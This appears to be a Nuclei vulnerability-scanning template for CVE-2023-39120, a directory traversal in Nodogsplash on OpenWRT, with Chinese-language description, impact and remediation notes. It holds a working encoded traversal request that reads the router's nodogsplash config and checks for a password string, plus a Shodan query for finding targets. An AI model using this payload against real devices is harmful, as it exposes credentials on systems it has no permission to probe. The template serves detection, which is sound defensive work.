id: nodogsplash-lfi

info:
  name: Nodogsplash - 目录遍历漏洞（CVE-2023-39120）
  author: Numan Türle
  severity: high
  description: |
    该模板用于检测 Nodogsplash - 目录遍历漏洞。该类漏洞通常源于文件路径、下载参数或资源加载接口缺少目录穿越和权限校验，导致任意文件被读取或包含。模板会向 `/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/config/nodogsplash` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可读取配置文件、源码、日志、密钥或系统敏感文件。
    - 若文件包含点可被利用，可能进一步造成代码执行、凭据泄露或对内部系统的持续入侵。
  remediation: |
    - 对文件访问参数使用固定映射或白名单，禁止直接使用用户输入拼接文件路径。
    - 规范化并校验最终路径，阻断 `../`、编码绕过和绝对路径访问。
    - 限制应用进程的文件系统权限，避免配置、密钥和日志被 Web 服务账号读取。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-39120
    - https://github.com/nodogsplash/nodogsplash/commit/a745a5d635925d2a6f0e0530bdc0eac645b672ed
    - https://gist.github.com/numanturle/55cb758bacc4930a081e79c2a6a769b6
    - https://github.com/openwrt/routing/pull/997
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"OpenWRT"
  tags: lfi,openwrt,nodogsplash,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/config/nodogsplash"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "nodogsplash"
          - "password"
        condition: and

      - type: word
        part: header
        words:
          - "application/octet-stream"

      - type: status
        status:
          - 200
